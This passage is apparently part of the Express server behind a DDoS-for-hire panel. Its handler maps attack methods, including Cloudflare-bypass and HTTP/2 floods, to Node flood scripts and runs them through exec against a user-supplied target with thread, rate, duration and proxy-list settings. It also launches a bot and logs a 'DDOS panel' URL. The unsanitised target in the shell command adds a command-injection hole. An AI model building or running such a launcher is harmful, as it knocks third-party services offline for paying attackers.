      command = `node HTTPS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTPX") {
      command = `node HTTPX.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTP-X") {
      command = `node HTTP-X.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "RAW") {
      command = `node RAW.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "TLS") {
      command = `node TLS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "UAM") {
      command = `node UAM.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CF") {
      command = `node CF.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "H2") {
      command = `node H2.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CF-BYPASS") {
      command = `node CF-BYPASS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else {
      return res.status(500).json({ 
        status: false, 
        message: "The method has not been handled on the server." 
      });
    }

    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`❌ Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.warn(`⚠️ Stderr: ${stderr}`);
      }
      console.log(`✅ Output: ${stdout}`);
    });

    return res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      Threads: threadCount,
      Rate: rateCount,
      News: "Success",
      proxyStatus: proxyStatus
    });

  } catch (err) {
    console.error("error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📱 Access dashboard: https://nullbyte.space/dashboard`);
  console.log(`⚡ Access DDOS panel: https://nullbyte.space/ddos-dashboard`);
  console.log(`🌐 Public URL: https://nullbyte.space/`);
});
